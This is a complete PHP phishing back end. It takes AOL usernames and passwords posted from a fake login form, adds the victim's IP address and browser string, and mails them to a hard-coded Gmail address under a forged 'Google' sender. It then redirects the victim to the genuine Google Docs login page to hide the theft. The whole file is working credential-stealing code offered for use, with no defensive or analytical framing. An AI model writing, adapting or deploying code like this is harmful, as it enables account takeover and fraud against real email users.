<?php

$Email = $_POST['aoluser'];
$password = $_POST['aolpassword'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "---------------+ I Begin +--------------\n";
$message .= "User ID    : ".$Email."\n";
$message .= "Password   : ".$password."\n";
$message .= "--------------------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------+ Aol Email Account! by Anderson Enjoy!!! +--------------\n";

$send="evesykora@gmail.com";
$send="evesykora@gmail.com";


$subject = "Google Doc AOL - IP: ".$ip."\n ";
$headers = "From: Google <evesykora@gmail.com>";
$str=array($send); foreach ($str as $send)
if(mail($send,$subject,$message,$headers) != false){


header("Location: https://accounts.google.com/ServiceLogin?service=writely&passive=1209600&continue=http://docs.google.com/#&followup=http://docs.google.com/&ltmpl=homepage");
}

?>